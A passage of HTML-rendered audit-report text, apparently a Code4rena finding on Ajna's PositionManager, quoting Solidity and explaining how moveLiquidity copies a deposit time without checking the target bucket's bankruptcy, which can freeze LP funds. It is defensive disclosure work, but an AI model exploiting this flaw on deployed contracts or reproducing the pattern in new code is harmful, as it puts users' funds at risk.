class=\"mtk1\">.</span><span class=\"mtk12\">bucketLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bankruptcyTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">bucketInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that bucket hasn&#39;t gone bankrupt since memorialization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bankruptcyTime</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BucketBankrupt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the max amount of quote tokens that can be moved, given the tracked LP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxQuote</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_lpToQuoteToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_priceAt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">EnumerableSet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">UintSet</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positionIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// remove bucket index from which liquidity is moved from tracked positions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\">.</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemovePositionFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update bucket set at which a position has liquidity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// slither-disable-next-line unused-return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// move quote tokens in pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountTo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">moveQuoteToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxQuote</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expiry</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update position LP state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\">   += </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountTo</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update position deposit time to the from bucket deposit time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;      </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>I.e. there is no check for <code>params_.toIndex</code> bucket situation, the time is just copied.</p>\n<p>While there is checking logic in LenderActions, which checks for <code>toBucket</code> bankruptcy and sets the time accordingly:</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LenderActions.sol#L315-L327\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LenderActions.sol#L315-L327</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toBucketDepositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">toBucketLender</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toBucketBankruptcyTime</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toBucketDepositTime</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// bucket is bankrupt and deposit was done before bankruptcy time, reset lender lp amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">toBucketLender</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">toBucketLP_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// set deposit time of the lender&#39;s to bucket as bucket&#39;s last bankruptcy timestamp + 1 so deposit won&#39;t get invalidated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toBucketDepositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toBucketBankruptcyTime</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">toBucketLender</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">toBucketLP_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// set deposit time to the greater of the lender&#39;s from bucket and the target bucket</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">toBucketLender</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">max</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromBucketDepositTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toBucketDepositTime</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>This way, while bucket structure deposit time will be controlled and updated, PositionManager’s structure will have the deposit time copied over.</p>\n<p>In the case when <code>positions[params_.tokenId][params_.fromIndex].depositTime</code> was less than <code>params_.toIndex</code> <code>bankruptcyTime</code>, this will freeze these LP funds as further attempts to use them will be blocked:</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L285\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L285</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">moveLiquidity</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MoveLiquidityParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mayInteract</span><span class=\"mtk1\">(params_.pool, params_.tokenId) </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MoveLiquidityLocalVars</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;      </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// handle the case where owner attempts to move liquidity after they&#39;ve already done so</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemovePositionFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ensure bucketDeposit accounts for accrued interest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateInterest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// retrieve info of bucket from which liquidity is moved  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;          </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bankruptcyTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">bucketInfo</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that bucket hasn&#39;t gone bankrupt since memorialization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bankruptcyTime</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BucketBankrupt</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L352-L372\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L352-L372</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">reedemPositions</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">RedeemPositionsParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mayInteract</span><span class=\"mtk1\">(params_.pool, params_.tokenId) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">EnumerableSet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">UintSet</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positionIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">indexesLength</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">index</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemovePositionFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check that bucket didn&#39;t go bankrupt after memorialization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_bucketBankruptAfterDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BucketBankrupt</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L436-L443\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L436-L443</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_bucketBankruptAfterDeposit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IPool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositTime_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (, , </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bankruptcyTime</span><span class=\"mtk1\">, , ) = </span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bucketInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">index_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;      </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositTime_</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">bankruptcyTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 